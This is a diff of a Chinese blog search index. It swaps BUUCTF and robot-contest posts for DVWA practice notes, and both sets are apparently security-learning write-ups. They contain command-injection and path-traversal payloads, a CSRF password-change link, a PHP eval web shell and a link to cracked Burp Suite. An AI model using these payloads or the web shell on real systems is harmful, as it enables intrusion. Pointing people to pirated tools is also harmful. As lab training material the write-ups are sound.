@@ -1,261 +1,127 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>buuctf刷题记录</title>
-    <url>/2024/04/30/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<p>未来怎么又可期了</p>
+    <title>DVWA靶场练习笔记</title>
+    <url>/2023/11/01/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<p>发现了一个很棒的靶场，里面囊括了Web方向的大多数常见漏洞，并且还分了四个难度等级（Low,Medium,High,Impossible），很适合目前我的需求。</p>
 <span id="more"></span>
 
-<details>
-<summary>Web</summary>
-
-<details>
-<summary>[极客大挑战 2019]EasySQL</summary>
-
-<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1714459494749.png" alt="1714459494749"></p>
-<p>数据交互点明显在页面上。验证SQL语句的闭合方式。</p>
-<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1714460320935.png" alt="1714460320935"></p>
-<p>判断出来为单引号。</p>
-<p>尝试使用万能密码。</p>
-<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1714460683481.png" alt="1714460683481"></p>
-<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1714460693162.png" alt="1714460693162"></p>
-<p>成功 <code>flag&#123;6ff105e8-e7ac-4cd0-9f14-14d8f41db6db&#125;</code></p>
-</details>
-
-<details>
-<summary>[极客大挑战 2019]Havefun</summary>
-
-<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1714461027021.png" alt="1714461027021"><br>页面上没有什么有用的信息。<br>查看一下前端：<br><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1714461210520.png" alt="1714461210520"></p>
-<p>尝试传入cat&#x3D;dog</p>
-<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1714461280981.png" alt="1714461280981"></p>
-<p>成功 <code>flag&#123;9b385537-e339-4d47-ac68-10fcc3c9217c&#125;</code></p>
-</details>
-
-<details>
-<summary>[HCTF 2018]WarmUp</summary>
-
-<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1714462460575.png" alt="1714462460575"><br>页面同样是没有什么有用的信息。</p>
-<p>查看前端源码：</p>
-<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1714462534879.png" alt="1714462534879"></p>
-<p>里面提到了source.php，那就前往source.php看看</p>
-<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1714462574772.png" alt="1714462574772"></p>
-<p>出现了php源码，里面提到了还有一个hint.php，前往hint.php</p>
-<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1714462636641.png" alt="1714462636641"></p>
-<p>提示flag的文件名是ffffllllaaaagggg。</p>
-<p>回头查看source.php的信息</p>
+<p>TODO:</p>
 <ul>
-<li><code>$whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];</code>: 这是一个白名单数组，只有数组中的文件名才被允许访问。</li>
-<li><code>if (! isset($page) || !is_string($page))</code>: 检查 <code>$page</code> 变量是否已设置，并且确保它是一个字符串。</li>
-<li><code>if (in_array($page, $whitelist))</code>: 检查 <code>$page</code> 是否直接在白名单数组中。</li>
-<li><code>$_page = mb_substr($page, 0, mb_strpos($page . &#39;?&#39;, &#39;?&#39;))</code>: 这行代码试图去除查询字符串之后的部分，只留下文件名。</li>
-<li><code>if (in_array($_page, $whitelist))</code>: 再次检查处理后的文件名是否在白名单中。</li>
-<li><code>$_page = urldecode($page)</code>: 对 <code>$page</code> 进行 URL 解码，以防有编码过的字符。</li>
-<li><code>echo &quot;you can&#39;t see it&quot;</code>: 如果文件不在白名单中，输出这个信息。</li>
-<li><code>include $_REQUEST[&#39;file&#39;]</code>: 如果文件检查通过，包含并执行该文件。</li>
+<li><input disabled="" type="checkbox"> Low</li>
+<li><input disabled="" type="checkbox"> Medium</li>
+<li><input disabled="" type="checkbox"> High</li>
+<li><input disabled="" type="checkbox"> Impossible</li>
 </ul>
-<p>一共进行了四次过滤，因此构建 <code>http://d4284bb3-a9a4-46be-9050-f86dd118bdb6.node5.buuoj.cn:81/source.php?file=hint.php?/../../../../ffffllllaaaagggg</code></p>
-<p>成功。<code>flag&#123;8a16c171-c3a7-4dc0-8e6f-9d1892970174&#125;</code></p>
-</details>
 <details>
-<summary>[GXYCTF2019]Ping Ping Ping</summary>
 
-<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715129842819.png" alt="1715129842819"><br>看起来应该是一个指令注入<br>界面提示传入ip，先尝试正常使用<br><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715129922073.png" alt="1715129922073"><br>正常<br>指令注入可以使用 <code>&amp;&amp; || ；</code>间隔开。<code>&amp;&amp;</code>的含义是：如果前面的指令执行成功则执行后面的指令：<code>a&amp;&amp;b  a执行成功后则执行b</code>。<code>||</code>的含义是：如果前面的指令执行失败后则执行后者：<code>a||b a执行失败后才执行b</code>。<code>；</code>的含义是：前后指令按顺序执行：<code>a；b  先执行a再执行b</code>。<br>基于以上信息，构建 <code>?ip=127.0.0.1;whoami</code><br><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715132909524.png" alt="1715132909524"></p>
-<p>注入成功。</p>
-<p>构建语句为 <code>/?ip=127.0.0.1;ls</code>查看当前目录下的文件。</p>
-<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715133089504.png" alt="1715133089504"></p>
-<p>发现 <code>flag.php</code></p>
-<p>构建语句 <code>/?ip=127.0.0.1;cat%20flag.php</code></p>
-<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715133166932.png" alt="1715133166932"></p>
-<p><del>不给就不给怎么还骂人</del></p>
-<p><code>%20 </code>被过滤，用 <code>$IFS</code>代替空格，构建 <code>/?ip=127.0.0.1;cat$IFS$1flag.php</code>。里面$1代表传入的第一个参数，也就是 <code>flag.php</code>。</p>
-<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715133754043.png" alt="1715133754043"></p>
-<p><del>怎么又骂人</del></p>
-<p>flag也被过滤。尝试了多种间隔符都没有解决。</p>
-<p>转换思路，看看 <code>index.php</code>里面有什么东西。构建 <code>/?ip=127.0.0.1;cat$IFS$1index.php</code></p>
-<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715133815963.png" alt="1715133815963"></p>
-<p>里面提示了关于过滤的规则。</p>
-<ul>
-<li>如果 <code>$ip</code> 中包含空格，输出 “fxck your space!” 并终止执行。</li>
-<li>如果 <code>$ip</code> 中包含字符串 “bash”，输出 “fxck your bash!” 并终止执行。</li>
-<li>如果 <code>$ip</code> 中包含字符串 “flag”（不区分大小写），输出 “fxck your flag!” 并终止执行。</li>
-</ul>
-<p>那么尝试拆解一下flag <code>/?ip=127.0.0.1;b=lag;cat$IFS$1f$b.php</code></p>
-<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715134729614.png" alt="1715134729614"></p>
-<p>没有回显，但是没有报错 <del>开始怀疑人生</del></p>
-<p>然后不知道经过多长时间才发现flag在F12里</p>
-<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715134852929.png" alt="1715134852929"></p>
-<p>成功。<code>flag&#123;38db704f-52e3-4eb2-b399-78fd63d72d8c&#125;</code></p>
-</details>
+<summary>Brute Force(暴力破解)</summary>
 
 <details>
-<summary>[ACTF2020 新生赛]Exec</summary>
 
-<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715235491175.png" alt="1715235491175"></p>
-<p>一眼指令注入。</p>
-<p>先尝试正常操作。</p>
-<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715235556702.png" alt="1715235556702"></p>
-<p>没什么问题，开始加引号分离指令。</p>
-<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715235600533.png" alt="1715235600533"></p>
-<p>尝试查看当前目录下的文件。</p>
-<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715235655015.png" alt="1715235655015"></p>
-<p>发现只有index.php</p>
-<p>尝试cat一下index.php里的内容</p>
-<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715237202067.png" alt="1715237202067"></p>
-<p>应该就是当前的页面</p>
-<p>用 <code>ls -a</code>查看有没有隐藏的文件</p>
-<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715237274905.png" alt="1715237274905"></p>
-<p>没有，于是考虑用 <code>ls ../</code>查看上层文件</p>
-<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715237442872.png" alt="1715237442872"></p>
-<p>再往上</p>
-<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715237484105.png" alt="1715237484105"></p>
-<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715237508985.png" alt="1715237508985"></p>
-<p>发现了flag</p>
-<p>再往上返回的结果就完全一样了，说明flag所在的位置在最顶层目录中，于是构建 <code>127.0.0.1;cat /flag</code></p>
-<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715237666632.png" alt="1715237666632"></p>
-<p>成功。<code>flag&#123;63e5105c-9bcf-4910-96d0-559eb4e18961&#125;</code></p>
+<summary>Low</summary>
+
+<p><img src="/./images/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/1698826342694.png" alt="1698826342694"></p>
+<p>先随意选择一组用户名和密码看看会发生什么。</p>
+<p><img src="/./images/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/1698827316880.png" alt="1698827316880"></p>
+<p>显示用户名和&#x2F;或密码错误，除此之外没有任何的机制。所以考虑使用Burp的Intruder模块对用户名和密码进行爆破。</p>
+<p>这里由于username和password都需要爆破。所以考虑Pitchfork模块或者Cluster Bomb模块（Sniper和Batteringram只能导入一个payload），这里选择Clusterbomb。</p>
+<p>选择字典之后开始爆破。</p>
+<p><img src="/./images/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/1698831896134.png" alt="1698831896134"></p>
+<p>发现了一个长度明显有差异的返回长度。输入进去。</p>
+<p><img src="/./images/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/1698831967463.png" alt="1698831967463"></p>
 </details>
 
 </details>
+
+<hr>
+<details>
+<summary>Command Injection(指令注入)</summary>
+<details>
+<summary>Low</summary>
+
+<p><img src="/./images/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/1698843230447.png" alt="1698843230447"><br><del>（是知识盲区</del>  尝试着分析了一下，工作原理可能是直接将输入框内的文字与ping命令进行拼接。</p>
+<p><img src="/./images/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/1698843498673.png" alt="1698843498673"></p>
+<p>并且不能过滤不合法的输入，那么尝试一下用&amp;符号进行注入。<del>（windows命令行指令都是啥来着</del></p>
+<p><img src="/./images/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/1698843906106.png" alt="1698843906106"></p>
+</details>
+</details>
+
+<hr>
+<details>
+<summary>CSRF(Cross Site Request Forgery)(跨站请求伪造)</summary>
+<details>
+<summary>Low</summary>
+
+<p><img src="/./images/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/1698844012937.png" alt="1698844012937"></p>
+<p>尝试抓个包。</p>
+<p><img src="/./images/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/1698845752819.png" alt="1698845752819"></p>
+<p>发现是直接传递了新的密码和确认的密码，同时查看源代码发现是直接判断New password和Conf password是否相等，并没有其他的验证。</p>
+<p><img src="/./images/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/1700221775155.png" alt="1700221775155"></p>
+<p><del>普通版burp不具备生成CSRF poc的功能，换个工具先（</del>    burp汉化破解链接 <code>https://www.52pojie.cn/thread-1544866-1-1.html</code></p>
+<p>或者不使用poc工具，直接构造链接 <code>http://127.0.0.1/DVWA-2.3/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#</code> 即可 ，或者再用短链接生成器包装一下看着像那么回事也可以。</p>
+</details>
+</details>
+
+<hr>
+<details>
+<summary>File Inclusion(文件包含)</summary>
+<details>
+
+<summary>Low</summary>
+
+<p><img src="/./images/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/1698849299946.png" alt="1698849299946"></p>
+<p>页面上给了三个php文件，逐个点击后没有发现特别有用的信息。</p>
+<p><img src="/./images/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/1698849364929.png" alt="1698849364929"></p>
+<p><img src="/./images/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/1698849376545.png" alt="1698849376545"><img src="/./images/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/1698849392702.png" alt="1698849392702"></p>
+<p>然后注意到了浏览器的网址栏，发现所谓php文件的读取是直接将php文件传入page中再读出来，联系到标题的文件隐藏，尝试着将page&#x3D;file3.php改成page&#x3D;file4.php。</p>
+<p><img src="/./images/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/1698849666992.png" alt="1698849666992"></p>
+</details>
+</details>
+
+<hr>
+<details>
+<summary>File Upload(文件上传漏洞)</summary>
+<details>
+<summary>Low</summary>
+
+<p><img src="/./images/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/1700222526114.png" alt="1700222526114"></p>
+<p>虽然说是上传图片，但是源代码中没有对上传文件的格式作要求</p>
+<p>一句话木马干就完了 <code>&lt;?php @eval($_POST[&#39;z&#39;]);?&gt;</code></p>
+<p><del>tmd卡巴斯基怎么又给我的文件清理了</del></p>
+<p><img src="/./images/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/1700466093449.png" alt="1700466093449"></p>
+<p>上传成功，可以看到下面回显了路径，然后用蚁剑连接或者拼接路径也可以</p>
+<p><img src="/./images/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/1700466460394.png" alt="1700466460394"></p>
+<p>成功（记得把php文件删掉</p>
+</details>
+</details>
+
+<hr>
+<details>
+<summary>Insecure CAPTCHA(不安全验证码)</summary>
+
+<p><strong>因配置验证码的key有问题，所以暂时搁置</strong></p>
+</details>
+
+<hr>
+<details>
+
+<summary>SQL Injection(SQL注入)</summary>
 
 <details>
-<summary>Misc</summary>
+<summary>Low</summary>
 
-<details>
-<summary>[NewStarCTF 公开赛赛道]Whats HTTP</summary>
-
-<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715137041959.png" alt="1715137041959"></p>
-<p>过滤出http报文。</p>
-<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715137295220.png" alt="1715137295220"></p>
-<p>因为如果回执报文是404的话，报文长度一定都是一样的，所以把过滤后的报文按顺序排列，着重查看状态码为200的报文。或者直接筛选出状态码为报文 <code>http.response.code == 200</code></p>
-<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715137533601.png" alt="1715137533601"><br>发现了一个长度异常的报文，经过查看请求报文发现是get了sssssercet，看起来是有用的信息</p>
-<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715137597234.png" alt="1715137597234"></p>
-<p>提取出回执的data <code>4e6a5932597a59784e6a6333596a4d304e6a597a4d7a4d7a4d7a597a4e444d354e6a517a4d444d7a4d7a41324d7a4d324d7a637a4e7a4d344d7a517a4d6a4d324d7a6b7a4e7a4d784e6a497a4e544d304e6a51324e444d334d7a49324e54597a4e6a55335a413d3d</code></p>
-<p>一眼hex。-&gt;<code>NjY2YzYxNjc3YjM0NjYzMzMzMzYzNDM5NjQzMDMzMzA2MzM2MzczNzM4MzQzMjM2MzkzNzMxNjIzNTM0NjQ2NDM3MzI2NTYzNjU3ZA==</code></p>
-<p>一眼base64。-&gt;<code>666c61677b34663333363439643033306336373738343236393731623534646437326563657d</code></p>
-<p>又是hex。-&gt;<code>flag&#123;4f33649d030c6778426971b54dd72ece&#125;</code></p>
-<p>完成。<code>flag&#123;4f33649d030c6778426971b54dd72ece&#125;</code></p>
+<p><img src="/./images/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/1700468784744.png" alt="1700468784744"></p>
+<blockquote>
+<p>SQL注入的第一步就要判断注入类型。一般来说，SQL注入按照<strong>参数分类</strong>分为：<strong>字符型</strong>和<strong>数字型</strong>，按照<strong>页面回显</strong>分为<strong>回显注入</strong>和<strong>盲注</strong>，<strong>回显</strong>分为<strong>回显正常</strong>和<strong>回显报错</strong>，<strong>盲注</strong>分为<strong>时间盲注</strong>和<strong>布尔盲注</strong>。</p>
+<p><a href="https://eklos9z.github.io/2023/10/22/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#more">漏洞挖掘学习笔记 | Eklos&#39;s Blog (eklos9z.github.io)</a></p>
+</blockquote>
+<p><img src="/./images/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/1700541103208.png" alt="1700541103208"></p>
 </details>
-
-<details>
-<summary>[NewStarCTF 2023 公开赛道]流量！鲨鱼！</summary>
-
-<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715138777415.png" alt="1715138777415"><br>筛选出http报文<br><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715138836304.png" alt="1715138836304"></p>
-<p>发现了一个奇怪的报文: <code>Wm14aFozdFhjbWt6TldnMGNtdGZNWE5mZFRVelpuVnNYMkkzTW1FMk1EazFNemRsTm4wSwo=</code></p>
-<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715138858169.png" alt="1715138858169"></p>
-<p>查看一下对应的请求报文</p>
-<p><img src="/./images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1715138901713.png" alt="1715138901713"></p>
-<p>请求报文是在控制台注入了linux命令，是用base64编码以base64的编码格式输出ffffllllllll11111144444GGGGGG里的内容。实质上也就是对ffffllllllll11111144444GGGGGG的内容作两次base64加密。</p>
-<p>完成。<code>flag&#123;Wri35h4rk_1s_u53ful_b72a609537e6&#125;</code></p>
-</details>
-
 </details>
 ]]></content>
       <categories>
-        <category>CTF学习</category>
-      </categories>
-      <tags>
-        <tag>自学</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>机器人比赛避障项目赛后总结</title>
-    <url>/2023/08/15/%E6%9C%BA%E5%99%A8%E4%BA%BA%E6%AF%94%E8%B5%9B%E9%81%BF%E9%9A%9C%E9%A1%B9%E7%9B%AE%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[<p>在见到避障比赛的文件之后，对比赛算法的设计并没有我想象中那么困难：机器人直行——机器人识别到箭头——机器人向箭头指向的方向平移——机器人视野脱离箭头——机器人直行，但是直觉与经验都在告诉我这个比赛最困难的地方就是在于怎么样才能去识别到三个箭头的方向。</p>
-<span id="more"></span>
-
-<p>首先我通过阅读材料以及代码，很容易便对颜色识别代码进行了改写，通过改写ColorDetect.py中113行—133行，实现了识别到红色和蓝色向左平移，识别到黄色向右平移。如未识别到颜色则直行。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> __isRunning:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> detect_color != <span class="string">&#x27;None&#x27;</span>:</span><br><span class="line"></span><br><span class="line">               AGC.runActionGroup(<span class="string">&#x27;go_forward_fast&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                action_finish = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> detect_color == <span class="string">&#x27;red&#x27;</span>:</span><br><span class="line"></span><br><span class="line">AGC.runActionGroup(<span class="string">&#x27;left_move&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                    detect_color = <span class="string">&#x27;None&#x27;</span></span><br><span class="line"></span><br><span class="line">                    draw_color = range_rgb[<span class="string">&quot;black&quot;</span>]           </span><br><span class="line"></span><br><span class="line">                    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">elif</span> detect_color == <span class="string">&#x27;yellow&#x27;</span>:</span><br><span class="line"></span><br><span class="line">AGC.runActionGroup(<span class="string">&#x27;right_move&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                    detect_color = <span class="string">&#x27;None&#x27;</span></span><br><span class="line"></span><br><span class="line">                    draw_color = range_rgb[<span class="string">&quot;black&quot;</span>]           </span><br><span class="line"></span><br><span class="line">                    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> detect_color == <span class="string">&#x27;blue&#x27;</span>:</span><br><span class="line"></span><br><span class="line">AGC.runActionGroup(<span class="string">&#x27;left_move&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                    detect_color = <span class="string">&#x27;None&#x27;</span></span><br><span class="line"></span><br><span class="line">                    draw_color = range_rgb[<span class="string">&quot;black&quot;</span>]           </span><br><span class="line"></span><br><span class="line">                    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">                    time.sleep(<span class="number">0.01</span>)       </span><br><span class="line"></span><br><span class="line">                action_finish = <span class="literal">True</span>       </span><br><span class="line"></span><br><span class="line">                detect_color = <span class="string">&#x27;None&#x27;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">               time.sleep(<span class="number">0.01</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">            time.sleep(<span class="number">0.01</span>)</span><br></pre></td></tr></table></figure>
-
-<p>在实际测试中发现可能由于机器人腿部舵机或是场地摩擦力问题导致机器人并不能完全的达到平移效果，经过调整，将“平移”动作后加入一个“转体”动作即可修正平移产生的过度偏差。后续的工作便是在箭头识别设计成功之后，将颜色识别替换为箭头识别即可。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> detect_color == <span class="string">&#x27;red&#x27;</span>:</span><br><span class="line"></span><br><span class="line">AGC.runActionGroup(<span class="string">&#x27;left_move&#x27;</span>)</span><br><span class="line"></span><br><span class="line">AGC.runActionGroup(<span class="string">&#x27;turn_left_small_step&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                    detect_color = <span class="string">&#x27;None&#x27;</span></span><br><span class="line"></span><br><span class="line">                    draw_color = range_rgb[<span class="string">&quot;black&quot;</span>]   </span><br><span class="line"></span><br><span class="line">                    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">elif</span> detect_color == <span class="string">&#x27;yellow&#x27;</span>:</span><br><span class="line"></span><br><span class="line">AGC.runActionGroup(<span class="string">&#x27;right_move&#x27;</span>)</span><br><span class="line"></span><br><span class="line">AGC.runActionGroup(<span class="string">&#x27;turn_right_small_step&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                    detect_color = <span class="string">&#x27;None&#x27;</span></span><br><span class="line"></span><br><span class="line">                    draw_color = range_rgb[<span class="string">&quot;black&quot;</span>]   </span><br><span class="line"></span><br><span class="line">                    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"> </span><br></pre></td></tr></table></figure>
-
-<p>然后是对于箭头的识别的设计，我初步的思路是将标准箭头进行对半拆分，拆分成一个包含三角形的部分和只有矩形的部分，由于包含三角形的面积总是大于只有矩形的面积。因此可以把判断条件更改为“左右部分面积谁大”，即如果左半部分的面积更大则向左移动，右半部分的面积更大则向右移动。考虑到可能出现的图像处理问题，初步选择在lab空间中对图像进行处理。（下划线处为关键代码，下同）</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lab_data:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> i != <span class="string">&#x27;black&#x27;</span> <span class="keyword">and</span> i != <span class="string">&#x27;white&#x27;</span>:</span><br><span class="line"></span><br><span class="line">                frame_mask = cv2.inRange(frame_lab,</span><br><span class="line"></span><br><span class="line">                                         (lab_data[i][<span class="string">&#x27;min&#x27;</span>][<span class="number">0</span>],</span><br><span class="line"></span><br><span class="line">                                          lab_data[i][<span class="string">&#x27;min&#x27;</span>][<span class="number">1</span>],</span><br><span class="line"></span><br><span class="line">                                          lab_data[i][<span class="string">&#x27;min&#x27;</span>][<span class="number">2</span>]),</span><br><span class="line"></span><br><span class="line">                                         (lab_data[i][<span class="string">&#x27;max&#x27;</span>][<span class="number">0</span>],</span><br><span class="line"></span><br><span class="line">                                          lab_data[i][<span class="string">&#x27;max&#x27;</span>][<span class="number">1</span>],</span><br><span class="line"></span><br><span class="line">                                          lab_data[i][<span class="string">&#x27;max&#x27;</span>][<span class="number">2</span>]))  <span class="comment">#对原图像和掩模进行位运算</span></span><br><span class="line"></span><br><span class="line">                eroded=cv2.erode(frame_mask,cv2.getStructuringElement(cv2.MORPH_RECT, (<span class="number">3</span>, <span class="number">3</span>)))  <span class="comment">#腐蚀</span></span><br><span class="line"></span><br><span class="line">dilated=cv2.dilate(eroded,cv2.getStructuringElement(cv2.MORPH_RECT, (<span class="number">3</span>, <span class="number">3</span>))) <span class="comment">#膨胀</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> debug:</span><br><span class="line"></span><br><span class="line">                cv2.imshow(i, dilated)</span><br><span class="line"></span><br><span class="line">contours=cv2.findContours(dilated,cv2.RETR_EXTERNAL,cv2.CHAIN_APPROX_NONE)[-<span class="number">2</span>]  <span class="comment">#找出轮廓</span></span><br><span class="line"></span><br><span class="line">                areaMaxContour, area_max = getAreaMaxContour(contours)  <span class="comment">#找出最大轮廓</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> areaMaxContour <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> area_max &gt; max_area:<span class="comment">#找最大面积</span></span><br><span class="line"></span><br><span class="line">                        max_area = area_max</span><br><span class="line"></span><br><span class="line">                        color_area_max = i</span><br><span class="line"></span><br><span class="line">                        areaMaxContour_max = areaMaxContour</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> max_area &gt; <span class="number">200</span>:  <span class="comment"># 有找到最大面积</span></span><br><span class="line"></span><br><span class="line">            ((centerX, centerY), radius) = cv2.minEnclosingCircle(areaMaxContour_max)  <span class="comment"># 获取最小外接圆</span></span><br><span class="line"></span><br><span class="line">            centerX = <span class="built_in">int</span>(Misc.<span class="built_in">map</span>(centerX, <span class="number">0</span>, size[<span class="number">0</span>], <span class="number">0</span>, img_w))</span><br><span class="line"></span><br><span class="line">            centerY = <span class="built_in">int</span>(Misc.<span class="built_in">map</span>(centerY, <span class="number">0</span>, size[<span class="number">1</span>], <span class="number">0</span>, img_h))</span><br><span class="line"></span><br><span class="line">            radius = <span class="built_in">int</span>(Misc.<span class="built_in">map</span>(radius, <span class="number">0</span>, size[<span class="number">0</span>], <span class="number">0</span>, img_w))  </span><br><span class="line"></span><br><span class="line"> </span><br></pre></td></tr></table></figure>
-
-<p>根据预设代码的研究发现，如果直接对图像进行分割，它可能会导致对最大图像的识别的误差，即在切割之后的图像可能不是识别到的最大的轮廓，如果在收集并处理过图像之后，对图像的腐蚀膨胀操作可能无法使图像正常识别，猜测因为图像经腐蚀膨胀后两边图像的差异化不够明显。故方案作废。</p>
